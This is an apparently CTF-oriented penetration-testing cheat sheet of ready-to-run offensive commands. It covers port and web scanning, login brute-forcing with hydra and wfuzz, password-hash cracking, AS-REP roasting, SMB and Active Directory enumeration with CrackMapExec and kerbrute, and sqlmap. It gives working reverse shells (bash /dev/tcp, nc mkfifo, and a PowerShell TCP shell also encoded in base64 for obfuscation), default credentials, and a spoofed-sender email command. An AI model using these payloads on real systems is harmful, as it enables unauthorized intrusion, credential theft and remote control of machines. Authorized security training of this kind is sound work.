# Cyber Cheat Sheet

## Overview
- [Cyber Cheat Sheet](#cyber-cheat-sheet)
  - [Overview](#overview)
  - [Scanning ports](#scanning-ports)
  - [Search in files](#search-in-files)
  - [Web-scan](#web-scan)
    - [Gobuster](#gobuster)
    - [wfuzz](#wfuzz)
  - [Search non-secure files](#search-non-secure-files)
  - [Privilege escalation vectors](#privilege-escalation-vectors)
  - [Search vulnerabilities or exploit](#search-vulnerabilities-or-exploit)
  - [Payload generation](#payload-generation)
  - [Base64](#base64)
  - [Crack password](#crack-password)
  - [Samba](#samba)
  - [sqlmap](#sqlmap)
  - [Joomla](#joomla)
  - [Email](#email)
  - [Reverse shell](#reverse-shell)
  - [CrackMapExec](#crackmapexec)
  - [kerbrute](#kerbrute)
  
## Scanning ports

**[`^        back to top        ^`](#overview)**

Scan all TCP and UDP ports from interface tun0 at 1000 packets per second.

```shell
masscan -e tun0 -p1-65535,U:1-65535 <host> --rate=1000
```

Fast scan all ports with rustscan:

```shell
wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
unzip rustscan_2.1.0_both.zip
dpkg -i rustscan_2.1.0_amd64.deb
rustscan --ulimit=5000 --range=1-65535 -a <host> -- -A -sC
```

Slow scan all ports with nmap:

```shell
nmap --privileged -sV -sC -sS -p- -oN nmap <host>
```

To get more information about the services that are running on the ports, let's run an nmap scan with the -A option.

```shell
nmap -A -sV -sC <host> -p80,135,139,445
```

## Search in files

**[`^        back to top        ^`](#overview)**

Search in the files of directory /etc the string "pass":

```shell
grep -i -r "pass" ./etc/
grep -Frlw "pass" ./etc/
```
## Web-scan

### Gobuster

**[`^        back to top        ^`](#overview)**

Let's search the directories with gobuster. In the parameters we specify the number of threads 128 (-t), URL (-u), dictionary (-w) and extensions we are interested in (-x).

```shell
gobuster dir -t 128 -k -u <host> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi
gobsuter dir -t 50 -k -u http/10.10.x.x:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,301' --no-error
```

Let's search the subdomains with gobuster:

```shell
gobuster vhost -u <host> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k
```

### wfuzz

**[`^        back to top        ^`](#overview)**

Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.

```shell
pip install wfuzz
```

Let's search the subdomains with wfuzz:

```shell
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "<host>" -H "Host: FUZZ.<host>" --hl 7
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.<host>" -u http://<host> -t 100
```

Let's search the directories and files with wfuzz:

```shell
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 200,202,204,301,302,307,403 http://<host>/FUZZ
```

Login Form bruteforce. POST, Single list, filter string (hide):

```shell
wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
#Here we have filtered by line
```

Login Form bruteforce. POST, 2 lists, filter code (show):

```shell
wfuzz.py -c -z file,users.txt -z file,pass.txt --sc 200 -d "name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
#Here we have filtered by code
```

Login Form bruteforce. GET, 2 lists, filter string (show), proxy, cookies:

```shell
wfuzz -c -w users.txt -w pass.txt --ss "Welcome " -p 127.0.0.1:8080:HTTP -b "PHPSESSIONID=1234567890abcdef;customcookie=hey" "http://example.com/index.php?username=FUZZ&password=FUZ2Z&action=sign+in"
```

Cookie/Header bruteforce (vhost brute). Cookie, filter code (show), proxy:

```shell
wfuzz -c -w users.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "Cookie:id=1312321&user=FUZZ"  "http://example.com/index.php"
```

Cookie/Header bruteforce (vhost brute). User-Agent, filter code (hide), proxy:

```shell
wfuzz -c -w user-agents.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "User-Agent: FUZZ"  "http://example.com/index.php"
```

## Search non-secure files

**[`^        back to top        ^`](#overview)**

Find files with permission to execute files they normally would not be allowed to.

```shell
find / -type f -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

## Privilege escalation vectors

**[`^        back to top        ^`](#overview)**

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

  - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - LinEnum: https://github.com/rebootuser/LinEnum
  - LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
  - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
  - Linux Priv Checker: https://github.com/linted/linuxprivchecker 
  - WinPEAS can be downloaded https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS.
  - PrivescCheck can be downloaded https://github.com/itm4n/PrivescCheck.
  - WES-NG is a Python script that can be found and downloaded https://github.com/bitsadmin/wesng.

## Search vulnerabilities or exploit

**[`^        back to top        ^`](#overview)**

```shell
apt install docker.io
docker run -d -p 443:443 --name openvas mikesplain/openvas
```

This command will both pull the docker container and then run the container. It may take a few minutes for the container to fully set up and begin running. Once it is complete you can then navigate to ```https://127.0.0.1``` in your preferred browser and OpenVAS will be setup and ready to go!

Below are the default credentials to access OpenVAS/GVM:

```shell
Username: admin
Password: admin
```

Search exploit for service:

```shell
searchsploit squirrelmail 1.4
```

## Payload generation

**[`^        back to top        ^`](#overview)**

```shell
echo "bash -c 'bash -i >& /dev/tcp/<host>/4444 0<&1'" | base64
```

Open the listener for catch a shell:

```shell
rlwrap nc -nlvp 4444

or

nc -nlvp 4444
```

Or use [MSFVenom Payloads](msfvenom-payloads.md).


## Base64

**[`^        back to top        ^`](#overview)**

Base64 Encode/Decode:

```shell
echo "TEST" | base64
VEVTVAo=

echo "VEVTVAo=" | base64 --decode
TEST
```

Powershell ToBase64String & Linux base64:

```shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("<host>",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF8 -t UTF16LE | base64

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABoAG8AcwB0AD4A
IgAsADQANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0
AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4A
LgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBl
AGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUA
bgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBP
AGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4A
QQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0
AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQA
ZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBu
AGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsA
IAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAg
AD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcA
ZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBX
AHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwA
ZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBl
AG4AdAAuAEMAbABvAHMAZQAoACkA
```

```shell
echo "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABoAG8AcwB0AD4AIgAsADQANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" | base64 --decode

$client = New-Object System.Net.Sockets.TCPClient("<host>",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Crack password

**[`^        back to top        ^`](#overview)**

Hash identify:

```shell
hashcat --identify hash.txt
```

```shell
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Example output:

```text
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-sha256
```

```shell
./kerbrute userenum --dc <host> -d spookysec.local userlist.txt -t 100
GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip <host>
hashcat --force -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt 
```

```shell
hydra -l <username> -P <password list> <host> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V -F -u

hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <host> ftp
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <host> ssh
hydra -l milesdyson -P /usr/share/wordlists/rockyou.txt -vV <host> smb
hydra -t 16 -L users.txt -p PASSWORD -vV <host> ssh
```

## Samba

**[`^        back to top        ^`](#overview)**

Connect as anonymous:

```shell
smbclient //<host>/anonymous
```

Get shares that access for user:

```shell
smbmap -H <host> -u "USERNAME" -p "PASSWORD"
```

Connect as user:

```shell
smbclient //<host>/SHARE_NAME -U USERNAME
Password for [WORKGROUP\USERNAME]:
```

Download from samba folder:

```shell
smbget -R smb://<host>/anonymous
```

## sqlmap

**[`^        back to top        ^`](#overview)**

```shell
sqlmap -u "http://<host>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

## Joomla

**[`^        back to top        ^`](#overview)**

```shell
joomscan --url http://<host>
```

## Email

Send email with [swaks](https://github.com/jetmore/swaks):

```shell
swaks -f ${MAIL_FROM} -t ${MAIL_TO} -s ${MAIL_SMTP} --auth-user=${MAIL_AUTH} --auth-password=${MAIL_PASS} -tlsc -p ${MAIL_PORT} --body ${EMAIL} --header "Subject: Bruteforce Report" --add-header "Content-Type: text/plain; charset=UTF-8" --h-From: '"Cloud Storage" <'${MAIL_FROM}'>'
```

Send fast test email with [swaks](https://github.com/jetmore/swaks):

```shell
swaks -f ${MAIL_FROM} -t ${MAIL_TO} -s ${MAIL_SMTP} -auth-user=${MAIL_AUTH}  --auth-password=${MAIL_PASS} -tlsc -p ${MAIL_PORT} --body "TEST" --header "Subject: Mail Test"
```

## Reverse shell

```shell
bash -c "bash -i >& /dev/tcp/<host>/4444 0<&1"

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <host> 4444 >/tmp/f
```

## CrackMapExec

This package is a swiss army knife for pentesting Windows/Active Directory environments.

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

The biggest improvements over the above tools are:

- Pure Python script, no external tools required
- Fully concurrent threading
- Uses ONLY native WinAPI calls for discovering sessions, users, dumping SAM hashes etc…
- Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc…)

Additionally, a database is used to store used/dumped credentals. It also automatically correlates Admin credentials to hosts and vice-versa allowing you to easily keep track of credential sets and gain additional situational awareness in large environments.

```shell
apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
poetry install
cp /root/.cme/workspaces/default/smb.db ~/cme_smb.bak
rm -f /root/.cme/workspaces/default/smb.db
poetry run crackmapexec smb <host> -u guest -p '' --shares --rid-brute 10000
```

## kerbrute

Get valid users for domain:

```shell
cp /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt
sed -i "s|$|@DOMAIN.COM|" possible-usernames.txt
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build
./kerbrute userenum -d DOMAIN.COM ../possible-usernames.txt --dc DOMAIN.COM
```